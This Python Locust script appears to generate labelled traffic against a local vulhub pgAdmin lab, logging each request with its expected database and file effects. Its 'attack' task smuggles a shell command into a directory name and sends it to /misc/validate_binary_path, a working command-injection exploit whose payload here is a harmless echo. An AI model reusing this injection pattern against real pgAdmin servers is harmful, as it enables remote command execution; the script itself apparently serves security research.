from locust import HttpUser, task, between, events
from locust.clients import ResponseContextManager
import random
import string  
from loguru import logger  
import os
from itertools import count
import json
import gevent
import io
import re
import time
from playwright.sync_api import sync_playwright


data_dir = "/var/lib/pgadmin/storage/"

counter = count(0)  # 计数器，用于生成唯一的消息 ID
answer_file = os.path.join(os.path.dirname(__file__), "answers.json")  # 日志文件路径
answers = {}


# CRSF_TOKEN = None
# COOKIES = None
# USER_AGENT = None
users = [
    {
        "email": "vulhub@example.com",
        "password": "vulhub",
        "id": 1
    },
]
users_crt = []

@events.test_start.add_listener
def on_test_start(environment, **_kwargs):
    def get_pgadmin_headers(url, username, password):  
        with sync_playwright() as p:  
            browser = p.chromium.launch()
            logger.info("Browser launched")
            page = browser.new_page()  
            
            try:  
                # 访问登录页  
                page.goto(f"{url}/login")  
                
                # 填写并提交登录表单  
                page.fill('input[name="email"]', username)  
                page.fill('input[name="password"]', password)  
                page.click('button[type="submit"]')  
                
                logger.info("Login form submitted")
                # 等待页面加载完成  
                page.wait_for_load_state('networkidle')  
                logger.info("Page loaded")

                # 执行JavaScript提取CSRF令牌  
                csrf_token = page.evaluate("""() => {  
                    // 直接访问全局变量  
                    if (window.pgAdmin && pgAdmin.csrf_token)   
                        return pgAdmin.csrf_token;  
                    
                    // 通过RequireJS查找  
                    if (window.require && require.s && require.s.contexts && require.s.contexts._) {  
                        const modules = require.s.contexts._.defined;  
                        for (const key in modules) {  
                            if (modules[key] && modules[key].csrf_token) {  
                                return modules[key].csrf_token;  
                            }  
                        }  
                    }  
                    return null;  
                }""")  
                
                cookies = page.context.cookies()
                useragent = page.evaluate("navigator.userAgent")

                # 等待Servers目录元素出现  
                page.wait_for_selector('.file-entry.directory .directory-toggle')  
                
                # 点击Servers旁边的展开图标  
                page.click('.file-entry.directory .directory-toggle')  
                
                # 等待子项加载  
                time.sleep(1)

                return csrf_token, cookies, useragent
            finally:  
                browser.close()
    
    # CRSF_TOKEN, COOKIES, USER_AGENT = get_pgadmin_headers("http://localhost:5050", "vulhub@example.com", "vulhub")
    for user in users:
        crt = {}
        crt["CRSF_TOKEN"], crt["COOKIES"], crt["USER_AGENT"] = get_pgadmin_headers("http://localhost:5050", user["email"], user["password"])
        users_crt.append(crt)
    input("Press Enter to Start the test...")  # 等待用户按下回车键


def calculate_bytes_sent(method: str, uri: str, request_headers: dict, body: str) -> int:
    """计算请求的字节数"""
    request_line = f"{method} {uri} HTTP/1.1\r\n"
    headers = "".join([f"{key}: {value}\r\n" for key, value in request_headers.items()])
    request = f"{request_line}{headers}\r\n{body}"
    return len(request)


def random_string(length: int = 15):  
    """生成随机字符串"""  
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))  


def new_log_entry(response: ResponseContextManager, extra: dict | None = None) -> dict:
    """创建新的日志条目""" 
    # print(response.request.body.decode("utf-8") if response.request.body else "")
    # print(response.request.headers)
    try:
        body = json.loads(response.request.body.decode("utf-8")) if response.request.body else {} 
        body = {k: str(v) for k, v in body.items()}  # 将所有值转换为字符串
    except json.JSONDecodeError:
        boundary_match = re.search(r'boundary=(.+?)', response.request.headers.get('Content-Type', ''))
        body = {}
        if boundary_match:
            boundary = boundary_match.group(1)
            # print("boundary:", boundary)
            parts = response.request.body.decode("utf-8").split('--' + boundary)
            for part in parts:
                if 'Content-Disposition' in part:
                    # 提取 name
                    name_match = re.search(r'name="([^"]+)"', part)
                    if name_match:
                        name = name_match.group(1)
                        if name == 'newfile':
                            # 提取 filename
                            filename_match = re.search(r'filename="([^"]+)"', part)
                            if filename_match:
                                body['filename'] = filename_match.group(1)
                        else:
                            # 提取对应的值
                            # print(repr(part.split(name)[1]))
                            value_match = re.search(r'\r\n\r\n(.*?)\r\n', part.split(name)[1], re.DOTALL)
                            if value_match:
                                value = value_match.group(1).strip()
                                body[name] = value

    if extra:
        for key, value in extra.items():
            body[key] = str(value)  # 将所有值转换为字符串
    return {
        "verb": response.request_meta["request_type"],
        "uri": response.request_meta["name"],
        "bytes_sent": calculate_bytes_sent(
            response.request_meta["request_type"],
            response.request_meta["name"],
            response.request.headers,
            response.request.body.decode("utf-8") if response.request.body else "",
        ),
        "num_params": len(body),
        "params": body,
    }


class APIUser(HttpUser):  
    """定义用户行为"""  
    wait_time = between(2, 4)  # 每次请求之间的等待时间（1到3秒之间随机）
    db_trans_id = None  # 初始化事务 ID
    file_trans_id = None
    attack_label = False
    user_index = 0  # 用户索引
    columns = [
        {
            "key": "message",
            "name": "message",
            "display_name": "message",
            "type": "character varying",
            "display_type": "character varying",
            "column_type_internal": "character varying",
            "pos": 0,
            "cell": "string",
            "can_edit": True,
            "not_null": True,
            "has_default_val": False,
            "is_array": False,
            "width": 126.72265625,
            "resizable": True,
            "editorOptions": {
            "commitOnOutsideClick": False
            }
        },
        {
            "key": "message_id",
            "name": "message_id",
            "display_name": "message_id",
            "type": "integer",
            "display_type": "[PK] integer",
            "column_type_internal": "integer",
            "pos": 1,
            "cell": "number",
            "can_edit": True,
            "not_null": True,
            "has_default_val": False,
            "is_array": False,
            "width": 96.388671875,
            "resizable": True,
            "editorOptions": {
            "commitOnOutsideClick": False
            }
        }
    ]
    
    def __init_db(self):
        # 初始化数据库事务
        trans_id = random.randint(1, 9999999)
        res = self.client.post(
            f"/sqleditor/panel/{trans_id}?is_query_tool=false&cmd_type=3&obj_type=table&obj_id=16385&sgid={users[self.user_index]['id']}&sid={users[self.user_index]['id']}&did=16384&server_type=pg",
            headers={"Content-Type": "application/x-www-form-urlencoded",
                    "Referer": f"http://localhost:5050/browser/",
                    "Proxy-Connection": "keep-alive",
                    "Host": "localhost:5050",
                    "Origin": "http://localhost:5050",},
            data={
                "title": "public.message/cve/postgres@cve"
            }
        )
        if res.status_code == 200:
            logger.info("Transaction ID obtained successfully")
        else:
            logger.error("Failed to obtain transaction ID")
            raise Exception("Failed to obtain transaction ID")
    
        res = self.client.post(
            f"/sqleditor/initialize/viewdata/{trans_id}/3/table/{users[self.user_index]['id']}/{users[self.user_index]['id']}/16384/16385",
        )
        if res.status_code == 200:
            logger.info("Transaction initialized successfully")
        else:
            logger.error("Transaction initialization failed")
            # logger.error(res.json())
            raise Exception("Transaction initialization failed")
    
        # 验证事务是否建立成功
        res = self.client.get(f"/sqleditor/status/{trans_id}")
        if res.status_code == 200:
            logger.info("Transaction established successfully")
        else:
            logger.error("Transaction establishment failed")
            raise Exception("Transaction establishment failed")
        self.db_trans_id = trans_id
        self.get_all_records()

    def __init_file_manager(self):
        # 初始化文件管理器
        res = self.client.post(
            "/file_manager/init",
            json={
                "dialog_type": "storage_dialog",
                "supported_types": ["sql","csv","json","*"],
                "dialog_title":"Storage Manager"
            }
        )
        if res.status_code == 200:
            self.file_trans_id = res.json()["data"]["transId"]
            logger.info("File manager initialized successfully")
        else:
            logger.error("File manager initialization failed")
            raise Exception("File manager initialization failed")
        
    def on_start(self):
        try:
            # 登陆获取Session和CSRF Token
            # self.client.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
            self.client.headers["Host"] = "localhost:5050"
            self.client.headers["Origin"] = "http://localhost:5050"
            self.user_index = random.randint(0, len(users_crt) - 1)
            CRSF_TOKEN = users_crt[self.user_index]["CRSF_TOKEN"]
            COOKIES = users_crt[self.user_index]["COOKIES"]
            USER_AGENT = users_crt[self.user_index]["USER_AGENT"]

            if all([CRSF_TOKEN, COOKIES, USER_AGENT]):
                self.client.headers["X-Pga-Csrftoken"] = CRSF_TOKEN
                self.client.headers["Cookie"] = "; ".join([f"{cookie['name']}={cookie['value']}" for cookie in COOKIES])
                self.client.headers["User-Agent"] = USER_AGENT
            else:
                logger.error("Failed to obtain CSRF token, cookies, or user agent.")
                raise Exception("Failed to obtain CSRF token, cookies, or user agent.")

            # 初始化数据库事务
            self.__init_db()
            # 初始化文件管理器
            self.__init_file_manager()

        except KeyboardInterrupt:
            logger.info("Test interrupted by user")
            raise
        except gevent.Timeout:
            logger.error("Timeout occurred")
            raise
        except Exception as e:
            gevent.sleep(1)
            self.on_start()
    
    
    # @task
    def get_all_records(self):
        # x_request_id = str(next(counter))
        with self.client.get(
            f"/sqleditor/view_data/start/{self.db_trans_id}",
            # headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
            else:
                response.failure(f"{response.text}, {response.request_meta}, {response.request.method}, {response.request.url}, {response.request.headers}, {response.request.body}")
        
        gevent.sleep(0.5)
        # x_request_id = str(next(counter))
        with self.client.get(
            f"/sqleditor/poll/{self.db_trans_id}",
            # headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                logger.info("Transaction poll successful")
                # 处理响应数据
                data = json.loads(response.text)
                if data.get("status") == "Success":
                    logger.info("Data retrieved successfully")
                    response.success()
            else:
                response.failure("Failed to poll transaction")
    
    # @task
    def add_record(self):
        message_id = random.randint(1, 9999999)
        message = random_string(15)
        payload = {
            "added_index": {"1": "1"},
            "added":{
                "1": {
                    "err": False,
                    "data": {
                        "message_id": message_id,
                        "message": message,
                    },
                }
            }
        }
        x_request_id = str(next(counter))
        # payload["columns"] = self.columns
        with self.client.post(
            f"/sqleditor/save/{self.db_trans_id}?type=insert",
            json=payload,
            headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                entry = new_log_entry(response)
                db_statements = [
                    {
                        "type": "INSERT",
                        "table": "public.message",
                        "columns": {
                            "message_id": str(message_id),
                            "message": message,
                        },
                        "is_match": True
                    }
                ]
                curr_time = time.time()
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": curr_time,
                }
                response.success()
            else:
                response.failure(f"{response.text}, {response.request_meta}, {response.request.method}, {response.request.url}, {response.request.headers}, {response.request.body}")

    # @task
    def update_record(self):
        message_id = random.randint(1, 9999999)
        message = random_string(15)
        payload = {
            "updated":{
                "1": {
                    "err": False,
                    "data": {
                        "message": message,
                    },
                    "primary_keys": {
                        "message_id": message_id,
                    }
                }
            }
        }
        x_request_id = str(next(counter))
        with self.client.post(
            f"/sqleditor/save/{self.db_trans_id}?type=update",
            json=payload,
            headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
                entry = new_log_entry(response)
                db_statements = [
                    {
                        "type": "UPDATE",
                        "table": "public.message",
                        "columns": {
                            "message": message,
                            "message_id": str(message_id),
                        },
                        "is_match": True
                    }
                ]
                curr_time = time.time()
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": curr_time,
                }
            else:
                response.failure(f"{response.text}, {response.request_meta}, {response.request.method}, {response.request.url}, {response.request.headers}, {response.request.body}")

    # @task
    def delete_record(self):
        message_id = random.randint(1, 9999999)
        payload = {
            "deleted":{
                "1": {
                    "message_id": message_id,
                }
            }
        }
        payload["columns"] = self.columns
        x_request_id = str(next(counter))
        with self.client.post(
            f"/sqleditor/save/{self.db_trans_id}?type=delete",
            json=payload,
            headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
                entry = new_log_entry(response)
                db_statements = [
                    {
                        "type": "DELETE",
                        "table": "public.message",
                        "columns": {
                            "message_id": str(message_id),
                        },
                        "is_match": True
                    }
                ]
                curr_time = time.time()
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "db_statements": db_statements,
                    "request_time": curr_time,
                }
            else:
                response.failure(f"{response.text}, {response.request_meta}, {response.request.method}, {response.request.url}, {response.request.headers}, {response.request.body}")

    def _upload_file(self, path="/"):
        # 上传文件
        file_content = random_string(100)
        file_name = f"test_{random_string(10)}.txt"
        file_content = io.StringIO(file_content)
        if not path.endswith("/"):
            path += "/"
        x_request_id = str(next(counter))
        with self.client.post(
            f"/file_manager/filemanager/{self.file_trans_id}/?type=add_file",
            files={"newfile": (file_name, file_content, "text/plain")},
            data={"mode": "add", "currentpath": path},
            headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
                entry = new_log_entry(response)
                fs_operations = [
                    {
                        "operation": "create",
                        "source_path": data_dir + users[self.user_index]["email"].replace("@", "_") + path + file_name,
                        "destination_path": None,
                        "is_directory": False,
                        "is_match": True
                    },
                    {
                        "operation": "update",
                        "source_path": data_dir + users[self.user_index]["email"].replace("@", "_") + path + file_name,
                        "destination_path": None,
                        "is_directory": False,
                        "is_match": True
                    },
                    # {
                    #     "operation": "update",
                    #     "source_path": "/var/log/pgadmin/pgadmin4.log",
                    #     "destination_path": None,
                    #     "is_directory": False,
                    #     "is_match": True
                    # },
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure("Fail")

    def _add_directory(self, path="/", dirname=None):
        # 创建目录
        if not path.endswith("/"):
            path += "/"
        dir_name = f"test_dir_{random_string(10)}" if dirname is None else dirname
        x_request_id = str(next(counter))
        with self.client.post(
            f"/file_manager/filemanager/{self.file_trans_id}/?type=add_folder",
            json={"mode": "addfolder", "name": dir_name, "path": path},
            headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
                entry = new_log_entry(response)
                fs_operations = [
                    {
                        "operation": "create",
                        "source_path": data_dir + users[self.user_index]["email"].replace("@", "_") + path + dir_name,
                        "destination_path": None,
                        "is_directory": True,
                        "is_match": True
                    },
                    # {
                    #     "operation": "update",
                    #     "source_path": "/var/log/pgadmin/pgadmin4.log",
                    #     "destination_path": None,
                    #     "is_directory": False,
                    #     "is_match": True
                    # },
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
                # logger.info(f"Directory created: {data_dir + users[self.user_index]['email'] + path + dir_name}")
            else:
                response.failure("Fail")

    def _rename_file_or_directory(self, old_path, new_name):
        # 重命名文件或目录
        x_request_id = str(next(counter))
        with self.client.post(
            f"/file_manager/filemanager/{self.file_trans_id}/?type=rename",
            json={"mode": "rename", "old": old_path, "new": new_name},
            headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
                entry = new_log_entry(response)
                fs_operations = [
                    {
                        "operation": "move",
                        "source_path": data_dir + users[self.user_index]["email"].replace("@", "_") + old_path,
                        "destination_path": data_dir + users[self.user_index]["email"].replace("@", "_") + old_path.rsplit("/", 1)[0] + "/" + new_name,
                        "is_directory": not old_path.endswith(".txt"),
                        "is_match": True
                    },
                    # {
                    #     "operation": "update",
                    #     "source_path": "/var/log/pgadmin/pgadmin4.log",
                    #     "destination_path": None,
                    #     "is_directory": False,
                    #     "is_match": True
                    # },
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure("Fail")

    def _delete_file_or_directory(self, path):
        # 删除文件或目录
        x_request_id = str(next(counter))
        with self.client.post(
            f"/file_manager/filemanager/{self.file_trans_id}/?type=delete",
            json={"mode": "delete", "path": path},
            headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
                entry = new_log_entry(response)
                fs_operations = [
                    {
                        "operation": "delete",
                        "source_path": data_dir + users[self.user_index]["email"].replace("@", "_") + path,
                        "destination_path": None,
                        "is_directory": False,
                        "is_match": True
                    },
                    # {
                    #     "operation": "update",
                    #     "source_path": "/var/log/pgadmin/pgadmin4.log",
                    #     "destination_path": None,
                    #     "is_directory": False,
                    #     "is_match": True
                    # },
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure("Fail")

    def _get_files(self, path="/"):
        # 获取文件列表
        # x_request_id = str(next(counter))
        with self.client.post(
            f"/file_manager/filemanager/{self.file_trans_id}/",
            json={"mode": "getfolder", "path": path, "file_type": "*", "show_hidden": True},
            # headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
                # entry = new_log_entry(response)
                # fs_operations = [
                    # {
                    #     "operation": "update",
                    #     "source_path": "/var/log/pgadmin/pgadmin4.log",
                    #     "destination_path": None,
                    #     "is_directory": False,
                    #     "is_match": True
                    # },
                # ]
                # answers[str(next(counter))] = {
                #     "http_request": entry,
                #     "fs_operations": fs_operations,
                #     "request_time": time.time(),
                # }
                return response.json()["data"]["result"]
            else:
                response.failure("Fail")
                print(response.json())
                return []

    # @task
    def modify_file(self):
        # gevent.sleep(random.randint(1, 3))
        files = self._get_files()
        # 打乱文件列表顺序
        random.shuffle(files)
        for file in files:
            if file["file_type"] == "dir":
                sub_files = self._get_files(file["Path"])
                if sub_files:
                    files.extend(self._get_files(file["Path"]))
            if len(files) > 10:
                break
        
        dirs = [file for file in files if file["file_type"] == "dir"]
        dirs.append({"Path": "/", "file_type": "dir"})
        files = [file for file in files if file["file_type"] != "dir"]

        operate = random.choice(["addfile", "adddir", "rename", "delete"])
        while len(files) == 0 and operate == "delete":
            operate = random.choice(["addfile", "adddir", "rename"])
        while len(files) == 0 and len(dirs) == 1 and operate == "rename":
            operate = random.choice(["addfile", "adddir"])
        if operate == "addfile":
            # 随机选择一个目录
            path = random.choice(dirs)["Path"]
            self._upload_file(path)
        elif operate == "adddir":
            # 随机选择一个目录
            path = random.choice(dirs)["Path"]
            self._add_directory(path)
        elif operate == "rename":
            # 随机选择一个文件或目录
            file = random.choice(files)
            while file["Path"] == "/":
                file = random.choice(files)
            old_path = file["Path"]
            new_name = f"new_{random_string(10)}"
            if file["file_type"] != "dir":
                new_name = f"{new_name}.{file['file_type']}"
            self._rename_file_or_directory(old_path, new_name)
        elif operate == "delete":
            # 随机选择一个文件或目录
            file = random.choice(files)
            path = file["Path"]
            self._delete_file_or_directory(path)
        else:
            logger.error("Invalid operation")
            raise Exception("Invalid operation")

    @task
    def attack(self):
        name = f"{random_string(5)}.txt"
        cmd = f"echo {random_string(10)} > {name}"
        dirname = f"\";{cmd};#"
        self._add_directory(dirname=dirname)
        change_dir = "/usr/local/lib/python3.10/site-packages/pgadmin4/"
        payload = {
            "utility_path": f"/var/lib/pgadmin/storage/vulhub_example.com/{dirname}"
        }
        x_request_id = str(next(counter))
        with self.client.post(
            f"/misc/validate_binary_path",
            json=payload,
            headers={"x_request_id": x_request_id},
            catch_response=True,
        ) as response:
            if response.status_code == 200:
                response.success()
                entry = new_log_entry(response)
                fs_operations = [
                    {
                        "operation": "create",
                        "source_path": change_dir + name,
                        "destination_path": None,
                        "is_directory": False,
                        "is_match": True
                    },
                    {
                        "operation": "update",
                        "source_path": change_dir + name,
                        "destination_path": None,
                        "is_directory": False,
                        "is_match": True
                    },
                    {
                        "operation": "update",
                        "source_path": change_dir + name,
                        "destination_path": None,
                        "is_directory": False,
                        "is_match": True
                    },
                    {
                        "operation": "update",
                        "source_path": change_dir + name,
                        "destination_path": None,
                        "is_directory": False,
                        "is_match": True
                    },
                    {
                        "operation": "update",
                        "source_path": change_dir + name,
                        "destination_path": None,
                        "is_directory": False,
                        "is_match": True
                    },
                ]
                answers[str(x_request_id)] = {
                    "http_request": entry,
                    "fs_operations": fs_operations,
                    "request_time": time.time(),
                }
            else:
                response.failure(f"{response.text}, {response.request_meta}, {response.request.method}, {response.request.url}, {response.request.headers}, {response.request.body}")

    def on_stop(self):
            # 关闭数据库事务
            res = self.client.delete(
                f"/sqleditor/close/{self.db_trans_id}",
            )
            if res.status_code == 200:
                logger.info("Transaction closed successfully")
            else:
                logger.error("Transaction closure failed")
                raise Exception("Transaction closure failed")
            # 关闭文件管理器
            res = self.client.delete(
                f"/file_manager/delete_trans_id/{self.file_trans_id}",
            )
            if res.status_code == 200:
                logger.info("File manager closed successfully")
            else:
                logger.error("File manager closure failed")
                raise Exception("File manager closure failed")


@events.test_stop.add_listener
def on_test_stop(environment, **_kwargs):
    # 将答案写入文件
    with open(answer_file, "w") as f:
        json.dump(answers, f, indent=4)
    logger.info(f"Answers written to {answer_file}")
